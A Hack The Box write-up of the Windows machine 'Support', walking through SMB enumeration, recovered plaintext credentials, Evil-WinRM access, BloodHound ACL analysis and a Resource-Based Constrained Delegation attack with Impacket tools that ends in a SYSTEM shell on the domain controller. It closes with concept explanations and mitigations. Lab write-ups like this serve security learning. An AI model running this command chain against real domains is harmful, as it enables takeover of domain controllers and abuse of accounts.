# Support--HackTheBox--Cybersecurity-Learning-Journey
I just solved Support on Hack The Box! 

# Hack The Box - Support Writeup

> **Platform:** Hack The Box
>
> **Machine:** Support
>
> **Difficulty:** Easy
>
> **Operating System:** Windows
>
> **Attack Chain:** SMB Enumeration → LDAP Enumeration → Credential Discovery → Evil-WinRM → BloodHound ACL Abuse → Resource-Based Constrained Delegation (RBCD) → Kerberos S4U → SYSTEM

---

# Machine Information

| Item | Value |
|------|-------|
| Name | Support |
| OS | Windows |
| Difficulty | Easy |
| Domain | SUPPORT.HTB |
| DC Hostname | DC.SUPPORT.HTB |

---

# Enumeration

## Nmap

```bash
nmap -sC -sV -Pn -oA support 10.129.x.x
```

Example output:

```
53/tcp    domain
88/tcp    kerberos
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kerberos-password
593/tcp   rpc
636/tcp   ldaps
3268/tcp  ldap
5985/tcp  winrm
```

The interesting services are:

- SMB
- LDAP
- Kerberos
- WinRM

---

# SMB Enumeration

Anonymous access:

```bash
smbclient -L //10.129.x.x -N
```

Discovered shares.

Browse shares:

```bash
smbclient //10.129.x.x/support-tools
```

Download everything:

```bash
mget *
```

---

# Reverse Engineering

One executable contained hardcoded credentials.

After reversing it, the following credentials were recovered:

```
Username:
support

Password:
Ironside47pleasure40Watchful
```

---

# WinRM Access

Login:

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

Verify:

```powershell
whoami
```

Output:

```
support\support
```

---

# User Flag

Navigate:

```powershell
cd C:\Users\support\Desktop
```

Read:

```powershell
type user.txt
```

---

# Active Directory Enumeration

Import AD module:

```powershell
Import-Module ActiveDirectory
```

Check current groups:

```powershell
whoami /groups
```

Interesting group:

```
Shared Support Accounts
```

---

# BloodHound Enumeration

Collect data:

```powershell
SharpHound.exe -c All
```

Import into BloodHound.

---

# BloodHound Findings

The critical path was:

```
Shared Support Accounts
        │
        ▼
GenericAll
        │
        ▼
DC$
```

This means members of the group can fully control the Domain Controller computer object.

This is sufficient to perform Resource-Based Constrained Delegation (RBCD).

---

# Machine Account Quota

By default, authenticated users may create machine accounts.

Create one:

```bash
python3 addcomputer.py \
support.htb/support:'Ironside47pleasure40Watchful' \
-computer-name ATTACKBOX$ \
-computer-pass 'Password123!'
```

Output:

```
Successfully added machine account ATTACKBOX$
```

---

# Configure RBCD

Grant delegation rights.

```bash
python3 rbcd.py \
-action write \
-delegate-from ATTACKBOX$ \
-delegate-to DC$ \
-dc-ip 10.129.x.x \
support.htb/support:'Ironside47pleasure40Watchful'
```

Verify:

```bash
python3 rbcd.py \
-action read \
-delegate-to DC$ \
-dc-ip 10.129.x.x \
support.htb/support:'Ironside47pleasure40Watchful'
```

Output:

```
ATTACKBOX$
```

Delegation is successfully configured.

---

# Kerberos S4U Attack

Request a service ticket while impersonating Administrator.

```bash
python3 getST.py \
support.htb/ATTACKBOX\$:'Password123!' \
-spn cifs/dc.support.htb \
-impersonate Administrator \
-dc-ip 10.129.x.x
```

Output:

```
Saving ticket in Administrator.ccache
```

---

# Export Kerberos Ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

---

# Remote Execution

Use Kerberos authentication.

```bash
python3 psexec.py \
-k \
-no-pass \
-dc-ip 10.129.x.x \
dc.support.htb
```

Successful output:

```
Microsoft Windows

C:\Windows\system32>
```

Verify:

```cmd
whoami
```

Output:

```
nt authority\system
```

---

# Root Flag

Read:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Flag:

```
a2f0c4604bbe4ec582db1a8419******
```

---

# Attack Chain

```
SMB Enumeration
        │
        ▼
Download Support Tools
        │
        ▼
Reverse Engineering
        │
        ▼
Recover Credentials
        │
        ▼
support User
        │
        ▼
WinRM
        │
        ▼
BloodHound
        │
        ▼
Shared Support Accounts
        │
        ▼
GenericAll
        │
        ▼
DC$
        │
        ▼
Create Machine Account
        │
        ▼
Resource-Based Constrained Delegation
        │
        ▼
S4U2Self
        │
        ▼
S4U2Proxy
        │
        ▼
Administrator Service Ticket
        │
        ▼
PsExec
        │
        ▼
NT AUTHORITY\SYSTEM
```

---

# Tools Used

- Nmap
- smbclient
- Evil-WinRM
- SharpHound
- BloodHound
- Impacket
  - addcomputer.py
  - rbcd.py
  - getST.py
  - psexec.py

---

# Active Directory Concepts

### SMB Enumeration

Used to identify accessible shares and retrieve potentially sensitive files.

---

### Reverse Engineering

Analyzing binaries can reveal embedded credentials, configuration values, or secrets left by developers.

---

### WinRM

Windows Remote Management allows remote PowerShell sessions when valid credentials are available.

---

### BloodHound

BloodHound maps relationships inside Active Directory and identifies privilege escalation paths based on ACLs, group memberships, sessions, delegation, and permissions.

---

### GenericAll

GenericAll grants full control over an Active Directory object.

For a computer object, this includes modifying important attributes such as:

- msDS-AllowedToActOnBehalfOfOtherIdentity

This attribute is the basis of Resource-Based Constrained Delegation.

---

### MachineAccountQuota

By default, domain users can create up to 10 computer accounts.

This allows attackers to introduce a controlled machine account into the domain.

---

### Resource-Based Constrained Delegation (RBCD)

RBCD allows a computer object to delegate authentication to another computer.

When attackers can modify the delegation attribute on a computer object, they can configure their own machine account to impersonate arbitrary users.

---

### Kerberos S4U

The attack uses two Kerberos extensions.

#### S4U2Self

Requests a service ticket for another user without requiring that user's password.

---

#### S4U2Proxy

Uses the delegated rights to request a service ticket to another service while impersonating the target user.

---

### PsExec

PsExec uploads a temporary service binary over SMB and executes it remotely using the obtained Kerberos ticket.

Because the ticket belongs to Administrator, the shell executes as:

```
NT AUTHORITY\SYSTEM
```

---

# Lessons Learned

- Enumerate SMB thoroughly.
- Reverse engineer downloaded binaries.
- Always inspect BloodHound ACL paths.
- GenericAll over computer objects is highly valuable.
- Resource-Based Constrained Delegation remains one of the most powerful Active Directory privilege escalation techniques.
- Kerberos delegation attacks can lead directly to Domain Controller compromise without knowing the Administrator password.

---

# Mitigations

- Set MachineAccountQuota to 0 if unnecessary.
- Restrict GenericAll permissions on computer objects.
- Monitor modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Regularly audit Active Directory ACLs.
- Limit the use of unconstrained and constrained delegation.
- Monitor creation of new machine accounts.
- Detect abnormal Kerberos S4U requests.
- Restrict WinRM access to administrative users.

---

# Conclusion

This machine demonstrates a realistic Active Directory privilege escalation scenario where an initially low-privileged domain user leverages object control permissions to compromise the Domain Controller. By abusing GenericAll over the domain controller computer object, creating a controlled machine account, configuring Resource-Based Constrained Delegation, and leveraging Kerberos S4U extensions, it is possible to impersonate the domain Administrator and obtain a SYSTEM shell on the Domain Controller without ever knowing the Administrator's password. This attack chain highlights the importance of properly auditing Active Directory permissions and understanding the security implications of delegation and ACL misconfigurations.

---

LinkedIn: [

X: [https://x.com/charisma1385/status/2072796246041887074]
---
#HackTheBox #HTB #Support #Windows #ActiveDirectory #AD #BloodHound #SharpHound #GenericAll #ACLAbuse #RBCD #ResourceBasedConstrainedDelegation #Kerberos #S4U #S4U2Self #S4U2Proxy #WinRM #SMB #LDAP #Impacket #PsExec #PrivilegeEscalation #DomainController #RedTeam #PenetrationTesting #CyberSecurity #Writeup
